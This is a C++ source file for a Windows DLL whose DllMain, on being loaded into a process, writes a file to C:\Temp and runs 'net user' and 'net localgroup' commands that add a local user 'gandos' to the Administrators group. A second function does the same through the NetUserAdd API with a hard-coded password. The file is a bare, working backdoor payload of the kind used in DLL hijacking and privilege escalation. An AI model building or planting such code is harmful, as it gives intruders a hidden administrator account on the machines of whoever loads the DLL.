// dllmain.cpp : Defines the entry point for the DLL application.
#ifndef UNICODE
#define UNICODE
#endif

#include "stdafx.h"
#include <cstdio>
#include <windows.h> 
#include <lm.h>
#include <fstream>

#pragma comment(lib, "netapi32.lib")

using namespace std;

void writeSomething()
{
	fwprintf(stderr, L"Writing to file\n");

	ofstream fout;
	fout.open("c:\\Temp\\afile.txt");
	fout << "write someting" << endl;
	fout.close();
}

void createNewUserCMD()
{
	system("net user gandos /add");
	system("net localgroup Administrators gandos /add");
}

NET_API_STATUS createNewAdmin()
{
	USER_INFO_1 ui;
	LOCALGROUP_MEMBERS_INFO_3 localgroup_members;
	DWORD dwLevel = 1;
	DWORD dwError = 0;
	NET_API_STATUS nStatus;

	ui.usri1_name = L"gandos";
	ui.usri1_password = L"gandos";
	ui.usri1_priv = USER_PRIV_USER;
	ui.usri1_home_dir = NULL;
	ui.usri1_comment = NULL;
	ui.usri1_flags = UF_SCRIPT;
	ui.usri1_script_path = NULL;

	nStatus = NetUserAdd(NULL,
		dwLevel,
		(LPBYTE)&ui,
		&dwError);
	//
	// If the call succeeds, inform the user.
	//
	if (nStatus == NERR_Success)
	{
		fwprintf(stderr, L"User %s has been successfully added on %s\n",
			ui.usri1_name, L"Localhost");

		localgroup_members.lgrmi3_domainandname = ui.usri1_name;

		nStatus = NetLocalGroupAddMembers(NULL,        // PDC name 
			L"Administrators",               // group name 
			3,                            // name 
			(LPBYTE)&localgroup_members, // buffer 
			1);


		if (nStatus == NERR_Success)
		{
			fwprintf(stderr, L"User %s has been added to Administrator\n",
				ui.usri1_name);
		}
		else
			fprintf(stderr, "A system error has occurred: %d\n", nStatus);
	}
	else
		fprintf(stderr, "A system error has occurred: %d\n", nStatus);



	return 0;
}

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
		writeSomething();
		createNewUserCMD();
		break;
    case DLL_THREAD_ATTACH:
		//writeSomething();
		//createNewAdmin();
		//break;
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

